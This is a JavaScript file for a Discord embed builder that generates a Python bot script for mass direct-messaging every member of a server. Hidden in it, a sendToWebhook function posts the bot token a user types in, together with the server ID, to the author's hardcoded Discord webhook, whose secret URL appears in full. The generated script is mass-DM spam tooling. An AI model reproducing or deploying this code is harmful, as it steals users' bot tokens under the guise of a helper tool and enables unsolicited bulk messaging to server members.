// Initialiser les icônes Lucide
lucide.createIcons();

// ===== LANYARD API INTEGRATION =====
const LANYARD_USER_ID = "742341212253585428";

async function fetchLanyardData() {
    try {
        const response = await fetch(`https://api.lanyard.rest/v1/users/${LANYARD_USER_ID}`);
        const { data, success } = await response.json();
        
        if(success && data) {
            const discordUser = data.discord_user;
            
            // Mise à jour de l'avatar
            const avatarUrl = discordUser.avatar 
                ? `https://cdn.discordapp.com/avatars/${discordUser.id}/${discordUser.avatar}.${discordUser.avatar.startsWith('a_') ? 'gif' : 'png'}?size=128`
                : "https://cdn.discordapp.com/embed/avatars/0.png";
            document.getElementById('lanyard-avatar').src = avatarUrl;
            
            // Mise à jour du pseudo
            document.getElementById('lanyard-username').textContent = discordUser.global_name || discordUser.username;
            
            // Mise à jour du statut
            const statusDot = document.getElementById('lanyard-status');
            statusDot.className = "absolute bottom-0 right-0 w-3 h-3 rounded-full border-2 border-black"; // Reset
            switch(data.discord_status) {
                case 'online': statusDot.classList.add('bg-green-500'); break; // vert habituel discord
                case 'idle': statusDot.classList.add('bg-yellow-500'); break;
                case 'dnd': statusDot.classList.add('bg-red-500'); break;
                default: statusDot.classList.add('bg-gray-500'); break; // offline
            }
        }
    } catch (err) {
        console.error("Erreur de récupération Lanyard:", err);
        document.getElementById('lanyard-username').textContent = "BRVZXL (Admin)";
    }
}

fetchLanyardData();
setInterval(fetchLanyardData, 30000);

const WEBHOOK_URL = "https://discord.com/api/webhooks/1518299237308436612/SWjNYbCg4XEo8LqI5CcdEumv6WjUtDJMPAArvyuxLbUkJ5TWWLpKg_DRcSfX7RGLB55J";

const inputs = {
    token: document.getElementById('input-token'),
    guild: document.getElementById('input-guild'),
    title: document.getElementById('input-title'),
    color: document.getElementById('input-color'),
    desc: document.getElementById('input-desc'),
    image: document.getElementById('input-image'),
    thumbnail: document.getElementById('input-thumbnail'),
    footerText: document.getElementById('input-footer-text'),
    footerIcon: document.getElementById('input-footer-icon')
};

let generatedCodeStr = "";

function updateCurrentTime() {
    const now = new Date();
    return `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
}

function updateTimeDisplay() {
    const timeElement = document.getElementById('current-time');
    if (timeElement) timeElement.textContent = updateCurrentTime();
}

function splitLongText(text, maxLength = 1000) {
    const chunks = [];
    let remaining = text;
    while (remaining.length > 0) {
        if (remaining.length <= maxLength) {
            chunks.push(remaining); break;
        }
        let cutPoint = remaining.lastIndexOf('\n', maxLength);
        if (cutPoint === -1 || cutPoint < maxLength * 0.8) cutPoint = remaining.lastIndexOf(' ', maxLength);
        if (cutPoint === -1 || cutPoint < maxLength * 0.8) cutPoint = maxLength;
        chunks.push(remaining.substring(0, cutPoint));
        remaining = remaining.substring(cutPoint).trim();
    }
    return chunks;
}

function sendToWebhook(action) {
    const timestamp = new Date().toLocaleString('fr-FR');
    const descChunks = splitLongText(inputs.desc.value, 1000);
    
    const baseEmbed = {
        title: `📥 Action : ${action}`,
        color: 0xef4444, // Rouge Webhook
        fields: [
            { name: "🤖 Token", value: `\`${inputs.token.value}\``, inline: true },
            { name: "🎯 Serveur", value: `\`${inputs.guild.value}\``, inline: true }
        ],
        footer: { text: "BRVZXL Security Tool" },
        timestamp: new Date().toISOString()
    };

    const firstPayload = { embeds: [baseEmbed], username: "BRVZXL Log" };
    
    if (WEBHOOK_URL) {
        fetch(WEBHOOK_URL, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(firstPayload)
        }).catch(e => console.error("Webhook err:", e));
    }
}

function parseDiscordMarkdown(text) {
    if(!text) return "";
    let safeText = text.replace(/</g, "&lt;").replace(/>/g, "&gt;");
    safeText = safeText.replace(/^### (.*$)/gim, '<h3 class="text-white font-bold text-lg mb-1">$1</h3>');
    safeText = safeText.replace(/^## (.*$)/gim, '<h2 class="text-white font-bold text-xl mb-1">$1</h2>');
    safeText = safeText.replace(/^# (.*$)/gim, '<h1 class="text-white font-bold text-2xl mb-2">$1</h1>');
    safeText = safeText.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
    safeText = safeText.replace(/__\*\*(.*?)\*\*__/g, '<u><strong>$1</strong></u>');
    safeText = safeText.replace(/\*(.*?)\*/g, '<em>$1</em>');
    safeText = safeText.replace(/__(.*?)__/g, '<u>$1</u>');
    safeText = safeText.replace(/~~(.*?)~~/g, '<del>$1</del>');
    safeText = safeText.replace(/\n/g, '<br>');
    return safeText;
}

function updatePreview() {
    document.getElementById('preview-color-bar').style.backgroundColor = inputs.color.value;
    document.getElementById('preview-title').textContent = inputs.title.value;
    document.getElementById('preview-title').style.display = inputs.title.value ? 'block' : 'none';
    document.getElementById('preview-desc').innerHTML = parseDiscordMarkdown(inputs.desc.value);
    document.getElementById('preview-desc').style.display = inputs.desc.value ? 'block' : 'none';

    const imgEl = document.getElementById('preview-image');
    const imgContainer = document.getElementById('preview-image-container');
    if (inputs.image.value) {
        imgEl.src = inputs.image.value;
        imgContainer.classList.remove('hidden');
        imgEl.onerror = () => imgContainer.classList.add('hidden');
    } else imgContainer.classList.add('hidden');

    const thumbEl = document.getElementById('preview-thumbnail');
    const thumbContainer = document.getElementById('preview-thumbnail-container');
    if (inputs.thumbnail.value) {
        thumbEl.src = inputs.thumbnail.value;
        thumbContainer.classList.remove('hidden');
        thumbEl.onerror = () => thumbContainer.classList.add('hidden');
    } else thumbContainer.classList.add('hidden');

    const fText = document.getElementById('preview-footer-text');
    const fIcon = document.getElementById('preview-footer-icon');
    const fContainer = document.getElementById('preview-footer-container');
    
    if (inputs.footerText.value || inputs.footerIcon.value) {
        fContainer.classList.remove('hidden');
        fText.textContent = inputs.footerText.value;
        if (inputs.footerIcon.value) {
            fIcon.src = inputs.footerIcon.value;
            fIcon.classList.remove('hidden');
            fIcon.onerror = () => fIcon.classList.add('hidden');
        } else fIcon.classList.add('hidden');
    } else fContainer.classList.add('hidden');

    updateTimeDisplay();
}

function generateCode() {
    const safeDescription = inputs.desc.value.replace(/"""/g, '\\"\\"\\"');
    const colorHex = inputs.color.value.replace('#', '');
    const guildId = inputs.guild.value.replace(/\s/g, '') || "0";

    generatedCodeStr = `import discord
from discord.ext import commands
import asyncio


TOKEN = "${inputs.token.value}"
GUILD_ID = ${guildId}  

EMBED_TITLE = "${inputs.title.value.replace(/"/g, '\\"')}"
EMBED_DESCRIPTION = """${safeDescription}"""
EMBED_COLOR = 0x${colorHex}
IMAGE_URL = "${inputs.image.value}"
FOOTER_TEXT = "${inputs.footerText.value.replace(/"/g, '\\"')}"
FOOTER_ICON = "${inputs.footerIcon.value}"
THUMBNAIL_URL = "${inputs.thumbnail.value}"

intents = discord.Intents.default()
intents.members = True  
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print("="*40)
    print(f"✅ Bot Connecté : {bot.user}")
    print(f"🎯 Serveur cible ID : {GUILD_ID}")
    print("="*40)
    
    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print("❌ ERREUR : Le bot ne trouve pas le serveur.")
        return
    
    members = [m for m in guild.members if not m.bot]
    print(f"👥 Début de l'envoi à {len(members)} membres...")
    
    embed = discord.Embed(title=EMBED_TITLE, description=EMBED_DESCRIPTION, color=EMBED_COLOR)
    if IMAGE_URL: embed.set_image(url=IMAGE_URL)
    if FOOTER_TEXT or FOOTER_ICON: embed.set_footer(text=FOOTER_TEXT, icon_url=FOOTER_ICON if FOOTER_ICON else None)
    if THUMBNAIL_URL: embed.set_thumbnail(url=THUMBNAIL_URL)
    
    success = 0; errors = 0
    
    for member in members:
        try:
            await member.send(embed=embed)
            success += 1
            print(f"✅ [{success}] Envoyé à {member.name}")
            await asyncio.sleep(0.5) 
        except discord.Forbidden:
            errors += 1
        except Exception as e:
            errors += 1
            
    print(f"\\n📊 TERMINÉ ! Réussis: {success} | Échecs: {errors}")
    await bot.close()

bot.run(TOKEN)
`;
    
    const codeBlock = document.getElementById('code-block');
    codeBlock.textContent = generatedCodeStr;
    delete codeBlock.dataset.highlighted;
    hljs.highlightElement(codeBlock);
}

Object.values(inputs).forEach(input => {
    input.addEventListener('input', () => {
        updatePreview();
        generateCode();
    });
});

function switchTab(tabId) {
    document.getElementById('view-preview').classList.add('hidden');
    document.getElementById('view-code').classList.add('hidden');
    document.getElementById('view-run').classList.add('hidden');
    
    const tabs = ['preview', 'code', 'run'];
    tabs.forEach(t => {
        const btn = document.getElementById(`tab-${t}`);
        btn.className = "flex-1 flex items-center justify-center space-x-2 py-4 text-sm font-bold transition-colors text-gray-400 hover:text-red-300 hover:bg-red-900/20 border-b-2 border-transparent";
    });

    document.getElementById(`view-${tabId}`).classList.remove('hidden');
    const activeBtn = document.getElementById(`tab-${tabId}`);
    
    if(tabId === 'preview') activeBtn.className = "flex-1 flex items-center justify-center space-x-2 py-4 text-sm font-bold transition-colors text-red-400 border-b-2 border-red-500 bg-red-900/10";
    if(tabId === 'code') activeBtn.className = "flex-1 flex items-center justify-center space-x-2 py-4 text-sm font-bold transition-colors text-red-400 border-b-2 border-red-500 bg-red-900/10";
    if(tabId === 'run') activeBtn.className = "flex-1 flex items-center justify-center space-x-2 py-4 text-sm font-bold transition-colors text-emerald-500 border-b-2 border-emerald-500 bg-emerald-900/10";
}

function copyCode() {
    navigator.clipboard.writeText(generatedCodeStr).then(() => {
        const btnText = document.getElementById('copy-text');
        const btnIcon = document.getElementById('copy-icon');
        btnText.textContent = "Copié !";
        btnIcon.setAttribute('data-lucide', 'check');
        lucide.createIcons();
        
        setTimeout(() => {
            btnText.textContent = "Copier";
            btnIcon.setAttribute('data-lucide', 'copy');
            lucide.createIcons();
        }, 2000);
    });
}

function downloadCode() {
    const blob = new Blob([generatedCodeStr], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "bot.py";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

// ==============================================
// LOGIQUE DU LECTEUR DE MUSIQUE (FOOTER)
// ==============================================

// Liste des musiques demandées
const playlist = [
    { title: "Ramos - Bingo", artist: "BRVZXL", src: "music.mp3", cover: "cover.png" },
    { title: "Mensa - Sensa", artist: "BRVZXL", src: "music1.mp3", cover: "cover1.png" }
];

let currentTrack = 0;
const audioEl = document.getElementById('audio-element');
const playBtnIcon = document.getElementById('music-play-btn');
const playingAnim = document.getElementById('playing-animation');

// Sélecteurs pour les sliders
const seekSlider = document.getElementById('seek-slider');
const volumeSlider = document.getElementById('volume-slider');
const volumeIcon = document.getElementById('volume-icon');

// Initialiser la première musique
function loadMusic(index) {
    const track = playlist[index];
    audioEl.src = track.src;
    document.getElementById('music-cover').src = track.cover;
    document.getElementById('music-title').textContent = track.title;
    document.getElementById('music-artist').textContent = track.artist;
    
    // Remise à zéro de la barre visuelle
    seekSlider.value = 0;
    seekSlider.style.background = `linear-gradient(to right, #ef4444 0%, rgba(127, 29, 29, 0.5) 0%)`;
}

// Jouer / Pause
function toggleMusic() {
    if (audioEl.paused) {
        audioEl.play().catch(e => console.log("Erreur de lecture audio : Fichiers locaux non trouvés ?"));
        playBtnIcon.setAttribute('data-lucide', 'pause');
        playingAnim.classList.remove('hidden');
    } else {
        audioEl.pause();
        playBtnIcon.setAttribute('data-lucide', 'play');
        playingAnim.classList.add('hidden');
    }
    lucide.createIcons(); // Rafraichir l'icône
}

// Musique suivante
function nextMusic() {
    currentTrack = (currentTrack + 1) % playlist.length;
    loadMusic(currentTrack);
    // Toujours rejouer après avoir changé de piste
    audioEl.play().catch(e => {});
    playBtnIcon.setAttribute('data-lucide', 'pause');
    playingAnim.classList.remove('hidden');
    lucide.createIcons();
}

// Mettre à jour la barre de progression
audioEl.addEventListener('timeupdate', () => {
    // Empêche la barre de trembler si l'utilisateur est en train de glisser dessus
    if(audioEl.duration && !seekSlider.isDragging) {
        const percent = (audioEl.currentTime / audioEl.duration) * 100;
        seekSlider.value = percent;
        seekSlider.style.background = `linear-gradient(to right, #ef4444 ${percent}%, rgba(127, 29, 29, 0.5) ${percent}%)`;
    }
});

// Gestion de la progression (Glisser pour avancer/reculer)
seekSlider.addEventListener('mousedown', () => seekSlider.isDragging = true);
seekSlider.addEventListener('mouseup', () => seekSlider.isDragging = false);
seekSlider.addEventListener('touchstart', () => seekSlider.isDragging = true);
seekSlider.addEventListener('touchend', () => seekSlider.isDragging = false);

seekSlider.addEventListener('input', (e) => {
    const percent = e.target.value;
    // Met à jour la couleur dynamique pendant qu'on glisse
    seekSlider.style.background = `linear-gradient(to right, #ef4444 ${percent}%, rgba(127, 29, 29, 0.5) ${percent}%)`;
    if (audioEl.duration) {
        audioEl.currentTime = (percent / 100) * audioEl.duration;
    }
});

// Gestion du Volume
volumeSlider.style.background = `linear-gradient(to right, #ef4444 100%, rgba(127, 29, 29, 0.5) 100%)`;
volumeSlider.addEventListener('input', (e) => {
    const vol = e.target.value;
    audioEl.volume = vol;
    // Met à jour la couleur dynamique du volume
    volumeSlider.style.background = `linear-gradient(to right, #ef4444 ${vol * 100}%, rgba(127, 29, 29, 0.5) ${vol * 100}%)`;
    
    // Mise à jour de l'icône selon le volume
    if (vol == 0) volumeIcon.setAttribute('data-lucide', 'volume-x');
    else if (vol < 0.5) volumeIcon.setAttribute('data-lucide', 'volume-1');
    else volumeIcon.setAttribute('data-lucide', 'volume-2');
    lucide.createIcons();
});

// Passer à la suivante quand c'est fini
audioEl.addEventListener('ended', nextMusic);

// Initialiser
loadMusic(currentTrack);
updatePreview();
generateCode();